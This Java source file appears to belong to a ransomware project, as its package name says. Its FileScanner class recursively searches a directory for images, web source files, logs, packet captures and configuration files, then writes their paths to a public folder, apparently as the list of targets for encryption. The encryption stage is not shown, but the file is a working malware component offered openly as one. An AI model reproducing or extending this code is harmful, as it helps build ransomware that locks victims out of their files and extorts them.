package com.margarito.ransomware;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class FileScanner extends FileProcessor {
    private static final List<String> IMAGE_EXTENSIONS = Arrays.asList(".jpg", ".jpeg", ".png", ".bmp", ".gif", ".tiff", ".ico");
    private static final List<String> WEB_DEV_EXTENSIONS = Arrays.asList(".php", ".jsp", ".asp", ".html", ".htm", ".css", ".js");
    private static final List<String> LOG_NET_EXTENSIONS = Arrays.asList(".log", ".pcap", ".pcapng", ".xml", ".txt", ".conf", ".ini");

    private List<String> scannedFiles;

    public FileScanner(String rootDirectory) {
        super(rootDirectory);
        this.scannedFiles = new ArrayList<>();
    }

    @Override
    public void processFiles(List<String> filePaths) {
        try (FileWriter writer = new FileWriter("C:\\Users\\Public\\scanned_paths.txt")) {
            for (String filePath : filePaths) {
                writer.write(filePath + "\n");
            }
            System.out.println("Scanning completed. Results saved.");
        } catch (IOException e) {
            System.out.println("Error writing file paths: " + e.getMessage());
        }
    }

    public List<String> scanDirectory(File directory) {
        if (!directory.exists() || !directory.isDirectory()) {
            return new ArrayList<>();
        }

        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    scanDirectory(file);
                } else if (isRelevantFile(file)) {
                    scannedFiles.add(file.getAbsolutePath());
                }
            }
        }
        return scannedFiles;
    }

    private boolean isRelevantFile(File file) {
        String fileName = file.getName();
        return hasExtension(fileName, IMAGE_EXTENSIONS) ||
                hasExtension(fileName, WEB_DEV_EXTENSIONS) ||
                hasExtension(fileName, LOG_NET_EXTENSIONS);
    }
}
